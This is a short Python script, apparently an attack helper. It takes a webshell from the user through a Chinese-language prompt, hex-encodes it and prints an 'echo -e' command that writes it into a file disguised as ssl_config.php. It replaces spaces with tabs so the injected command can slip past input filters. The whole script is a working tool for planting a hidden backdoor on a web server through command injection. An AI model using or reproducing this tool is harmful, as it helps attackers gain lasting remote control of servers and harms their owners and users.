import base64
cmd = input('请输入webshell： ')
cmd_hex = ''.join(f'\\\\x{ord(c):02x}' for c in cmd)
cmd_final = f"echo -e \"{cmd_hex}\" > ssl_config.php".replace(" ", "\t").replace("\n", "")
print(cmd_final)

